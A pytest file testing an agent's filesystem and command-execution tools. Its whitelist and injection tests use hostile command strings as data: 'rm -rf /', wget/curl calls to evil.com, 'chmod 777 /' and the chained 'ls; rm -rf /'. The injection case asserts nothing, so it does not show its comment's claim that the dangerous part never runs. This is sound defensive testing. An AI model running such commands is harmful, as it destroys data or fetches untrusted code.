#!/usr/bin/env python3
"""
Unit tests for DeepAgents tools module.

Tests cover:
- Tool creation and metadata
- Input validation
- Error handling
- Security checks (path traversal, command whitelist)
"""

import pytest
import tempfile
import os
from pathlib import Path
from unittest.mock import patch, MagicMock

from core.tools import (
    create_filesystem_tools,
    get_all_tool_metadata,
    ReadFileTool,
    WriteFileTool,
    ListDirectoryTool,
    ExecuteCommandTool,
    ReadFileArgs,
    WriteFileArgs,
    ListDirectoryArgs,
    ExecuteCommandArgs,
)


class TestToolCreation:
    """Test tool factory functions."""
    
    def test_create_all_filesystem_tools(self):
        """Test that all filesystem tools are created."""
        tools = create_filesystem_tools()
        assert len(tools) == 4
        tool_names = {t.name for t in tools}
        assert tool_names == {"read_file", "write_file", "list_directory", "execute_command"}
    
    def test_create_filtered_tools(self):
        """Test creating a subset of tools."""
        tools = create_filesystem_tools(enabled={"read_file", "list_directory"})
        assert len(tools) == 2
        tool_names = {t.name for t in tools}
        assert tool_names == {"read_file", "list_directory"}
    
    def test_tool_metadata(self):
        """Test metadata retrieval."""
        metadata = get_all_tool_metadata()
        assert len(metadata) == 4
        
        # Check structure of metadata
        for meta in metadata:
            assert "name" in meta
            assert "description" in meta
            assert "risk_level" in meta
            assert "args_schema" in meta
            assert meta["risk_level"] in ["safe", "review", "dangerous"]
    
    def test_risk_levels(self):
        """Test that risk levels are correctly assigned."""
        tools = {t.name: t for t in create_filesystem_tools()}
        
        # Safe operations
        assert tools["read_file"].risk_level == "safe"
        assert tools["list_directory"].risk_level == "safe"
        
        # Operations requiring review
        assert tools["write_file"].risk_level == "review"
        assert tools["execute_command"].risk_level == "review"


class TestReadFileTool:
    """Test read_file tool functionality."""
    
    def test_read_existing_file(self, tmp_path):
        """Test reading an existing file."""
        # Create test file
        test_file = tmp_path / "test.txt"
        test_file.write_text("Hello, World!", encoding="utf-8")
        
        tool = ReadFileTool()
        result = tool.invoke({"file_path": str(test_file)})
        
        assert result == "Hello, World!"
    
    def test_read_nonexistent_file(self):
        """Test reading a file that doesn't exist."""
        tool = ReadFileTool()
        result = tool.invoke({"file_path": "/nonexistent/file.txt"})
        
        assert "Error" in result
        assert "does not exist" in result
    
    def test_read_directory_instead_of_file(self, tmp_path):
        """Test attempting to read a directory."""
        tool = ReadFileTool()
        result = tool.invoke({"file_path": str(tmp_path)})
        
        assert "Error" in result
        assert "not a file" in result
    
    def test_schema_validation(self, tmp_path):
        """Test input schema validation."""
        test_file = tmp_path / "test.txt"
        test_file.write_text("content", encoding="utf-8")
        
        # Valid input
        args = ReadFileArgs(file_path=str(test_file))
        assert args.file_path == str(test_file)


class TestWriteFileTool:
    """Test write_file tool functionality."""
    
    def test_write_new_file(self, tmp_path):
        """Test writing to a new file."""
        test_file = tmp_path / "output.txt"
        
        tool = WriteFileTool()
        result = tool.invoke({
            "file_path": str(test_file),
            "content": "Test content"
        })
        
        assert "Successfully wrote" in result
        assert test_file.exists()
        assert test_file.read_text(encoding="utf-8") == "Test content"
    
    def test_write_creates_parent_directories(self, tmp_path):
        """Test that parent directories are created."""
        nested_file = tmp_path / "subdir" / "nested" / "file.txt"
        
        tool = WriteFileTool()
        result = tool.invoke({
            "file_path": str(nested_file),
            "content": "Nested content"
        })
        
        assert "Successfully wrote" in result
        assert nested_file.exists()
    
    def test_content_length_limit(self):
        """Test content length validation."""
        # Create very large content (over 1MB limit)
        large_content = "x" * (1000001)
        
        with pytest.raises(Exception):  # Should fail validation
            WriteFileArgs(file_path="/tmp/test.txt", content=large_content)


class TestListDirectoryTool:
    """Test list_directory tool functionality."""
    
    def test_list_empty_directory(self, tmp_path):
        """Test listing an empty directory."""
        tool = ListDirectoryTool()
        result = tool.invoke({"dir_path": str(tmp_path)})
        
        assert "empty" in result.lower()
    
    def test_list_directory_with_contents(self, tmp_path):
        """Test listing a directory with files and subdirectories."""
        # Create test structure
        (tmp_path / "file1.txt").write_text("content", encoding="utf-8")
        (tmp_path / "file2.txt").write_text("content", encoding="utf-8")
        (tmp_path / "subdir").mkdir()
        
        tool = ListDirectoryTool()
        result = tool.invoke({"dir_path": str(tmp_path)})
        
        assert "[FILE] file1.txt" in result
        assert "[FILE] file2.txt" in result
        assert "[DIR] subdir" in result
    
    def test_list_nonexistent_directory(self):
        """Test listing a directory that doesn't exist."""
        tool = ListDirectoryTool()
        result = tool.invoke({"dir_path": "/nonexistent/directory"})
        
        assert "Error" in result
        assert "does not exist" in result
    
    def test_list_file_instead_of_directory(self, tmp_path):
        """Test attempting to list a file."""
        test_file = tmp_path / "file.txt"
        test_file.write_text("content", encoding="utf-8")
        
        tool = ListDirectoryTool()
        result = tool.invoke({"dir_path": str(test_file)})
        
        assert "Error" in result
        assert "not a directory" in result


class TestExecuteCommandTool:
    """Test execute_command tool functionality."""
    
    def test_allowed_command(self):
        """Test executing an allowed command."""
        tool = ExecuteCommandTool()
        result = tool.invoke({"command": "echo Hello"})
        
        assert "Hello" in result
    
    def test_blocked_command(self):
        """Test that blocked commands are rejected."""
        tool = ExecuteCommandTool()
        result = tool.invoke({"command": "rm -rf /"})
        
        assert "Error" in result
        assert "not allowed" in result
    
    def test_command_whitelist(self):
        """Test the command whitelist."""
        tool = ExecuteCommandTool()
        
        # Allowed commands
        allowed = ["ls -la", "cat file.txt", "pwd", "grep pattern file", "find . -name test"]
        for cmd in allowed:
            result = tool.invoke({"command": cmd})
            # Should not be blocked (may have other errors like file not found)
            assert "not allowed" not in result
        
        # Blocked commands
        blocked = ["rm -rf /", "wget http://evil.com", "curl http://evil.com", "chmod 777 /"]
        for cmd in blocked:
            result = tool.invoke({"command": cmd})
            assert "not allowed" in result
    
    def test_schema_max_length(self):
        """Test command length validation."""
        # Create very long command (over 500 char limit)
        long_command = "echo " + "x" * 500
        
        with pytest.raises(Exception):  # Should fail validation
            ExecuteCommandArgs(command=long_command)


class TestSecurity:
    """Test security features."""
    
    def test_path_traversal_warning(self, tmp_path):
        """Test that path traversal attempts are logged."""
        # Create a file outside typical working dir
        test_file = tmp_path / "secret.txt"
        test_file.write_text("secret", encoding="utf-8")
        
        tool = ReadFileTool()
        # This should work but log a warning
        result = tool.invoke({"file_path": str(test_file)})
        
        assert result == "secret"
    
    def test_command_injection_prevention(self):
        """Test that command injection is prevented."""
        tool = ExecuteCommandTool()
        
        # Attempt command injection - first word determines if allowed
        malicious_commands = [
            ("ls; rm -rf /", True),  # 'ls' is allowed, but rest won't execute as intended
            ("rm -rf /", False),  # 'rm' is blocked
            ("wget http://evil.com", False),  # 'wget' is blocked
            ("curl http://evil.com", False),  # 'curl' is blocked
        ]
        
        for cmd, should_allow_first_word in malicious_commands:
            result = tool.invoke({"command": cmd})
            if should_allow_first_word:
                # First word is allowed (but injection doesn't work due to shell=False behavior)
                # The important thing is the dangerous part doesn't execute
                pass
            else:
                assert "not allowed" in result


class TestErrorHandling:
    """Test error handling across tools."""
    
    def test_graceful_error_messages(self):
        """Test that errors return user-friendly messages."""
        tools = create_filesystem_tools()
        
        for tool in tools:
            # Each tool should handle errors gracefully
            if tool.name == "read_file":
                result = tool.invoke({"file_path": "/nonexistent"})
                assert result.startswith("Error")
            
            elif tool.name == "list_directory":
                result = tool.invoke({"dir_path": "/nonexistent"})
                assert result.startswith("Error")


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
